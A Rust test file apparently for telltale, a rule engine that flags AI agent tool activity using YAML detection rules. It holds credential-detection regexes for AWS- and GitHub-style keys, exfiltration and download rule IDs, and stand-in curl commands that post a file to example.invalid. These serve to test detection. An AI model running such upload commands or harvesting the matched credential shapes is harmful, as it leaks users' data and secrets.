use super::*;

#[test]
fn credential_same_id_custom_predicate_does_not_inherit_native_refinements() {
    let document = r"
title: synthetic
id: 065b86f7-94a3-4e98-bd21-f378b77e2cd3
name: credential.api_key.pattern
taxonomy: telltale
logsource:
    product: ai_agent
    category: tool_activity
detection:
    selection:
        - tool.result|re: 'needle|AKIAIOSFODNN7EXAMPLE|_ghp_[A-Za-z0-9]{20,}'
    condition: selection
level: medium
telltale:
    category: credential_pattern
    score: 30
    explanation: 'synthetic'
";
    let export = telltale_rules::load_rule_set_from_documents(&[document], None)
        .unwrap()
        .compatibility_export();
    let plan = compile_rule_v1(&export).unwrap();
    for (text, matched) in [
        ("needle", true),
        ("AKIAIOSFODNN7EXAMPLE", true),
        ("_ghp_Zq3Wt9LmP2kR7vX4nB8c", true),
        ("ghp_Zq3Wt9LmP2kR7vX4nB8c", false),
        ("NEEDLE", false),
    ] {
        assert_credential_projections(&plan, credential_result(text), matched, matched, text);
    }
}

#[test]
fn custom_predicates_and_policy_are_effective_not_overridden_by_native_profiles() {
    let document = "title: synthetic\nid: 5a1cb130-ceb5-4e9f-ba17-6689869f1240\nname: network.download\ntaxonomy: telltale\nlogsource:\n    product: ai_agent\n    category: tool_activity\ndetection:\n    selection:\n        - tool.command|re: 'needle'\n    condition: selection\nlevel: low\ntelltale:\n    category: download\n    score: 3\n    explanation: 'synthetic'\n";
    let rules = telltale_rules::load_rule_set_from_documents(&[document], None).unwrap();
    let plan = compile_rule_v1(&rules.compatibility_export()).unwrap();
    let instance = CorrelationId::source_reported("source").unwrap();
    let observations = [
        tool(
            "custom",
            "curl https://example.invalid/a",
            Some("2026-09-17T00:00:00Z"),
        ),
        tool("custom-two", "needle", Some("2026-09-17T00:01:00Z")),
    ];
    let output = evaluate_source_with_options(
        CanonicalSourceInput {
            client: ClientId::Claude,
            source_id: "claude.projects",
            source_instance: Some(&instance),
            observations: &observations,
        },
        &plan,
        None,
        &DetailedEvaluationOptions::default(),
    )
    .unwrap();
    let findings = output.sessions()[0].action_findings();
    assert_eq!(findings.len(), 1);
    assert_eq!(findings[0].timeline_index(), 1);
    assert_eq!(findings[0].promotion_score(), 3);
}

#[test]
fn segment_scoped_download_follows_the_declared_yaml_in_sessions_and_keeps_native_actions() {
    let bundled = telltale_rules::bundled_default_rule_yaml().replace("\r\n", "\n");
    let both = ["exfil.outbound_upload", "network.download"].map(String::from);
    let upload = ["exfil.outbound_upload".to_string()];
    let separate =
        "curl --data @f https://example.invalid/upload; curl https://example.invalid/file";
    let same = "curl --data @f https://example.invalid/upload https://example.invalid/file";

    for newline in ["\n", "\r\n"] {
        let bundled = bundled.replace('\n', newline);
        let normalized = bundled.replace("\r\n", "\n");
        // The scope is a modifier on each selection and filter of the download
        // rule; Rule v2 spells field scope by leaving it out.
        // Six on the download rule, four on the registry credential rule.
        assert_eq!(normalized.matches("|segment:").count(), 10);
        let field_copy = normalized.replace("|segment:", ":");
        assert!(!field_copy.contains("|segment"));
        let fork = bundled
            .replace("network.download", "fork.network.download")
            .replace("exfil.outbound_upload", "fork.exfil.outbound_upload");

        // Bundled: the session reads the declared segment scope; native actions
        // read HTTP direction per command stage, as before.
        assert_eq!(
            evaluate_with(&bundled, separate),
            (both.to_vec(), both.to_vec())
        );
        assert_eq!(
            evaluate_with(&bundled, same),
            (upload.to_vec(), upload.to_vec())
        );

        // A renamed copy matches the same way in sessions: no rule ID selects it.
        let (fork_separate, _) = evaluate_with(&fork, separate);
        assert_eq!(
            fork_separate,
            ["fork.exfil.outbound_upload", "fork.network.download"]
        );
        assert_eq!(evaluate_with(&fork, same).0, ["fork.exfil.outbound_upload"]);

        // A same-ID copy in field scope is a different predicate, so it is not
        // mistaken for the bundled native profile.
        let document = field_copy.replace('\n', newline);
        assert_eq!(
            evaluate_with(&document, separate),
            (upload.to_vec(), upload.to_vec())
        );
    }
}
